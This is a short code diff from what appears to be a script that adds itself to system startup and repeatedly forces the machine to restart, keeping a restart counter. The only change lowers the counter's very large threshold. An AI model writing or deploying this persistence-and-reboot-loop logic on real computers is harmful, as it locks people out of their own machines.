@@ -48,7 +48,7 @@ def main():
 add_to_startup()
 count = get_restart_count()
 
-if count < 9999999999999999:  
+if count < 999999999999999:  
     save_restart_count(count + 1)  
     trigger_restart()  
 else:  
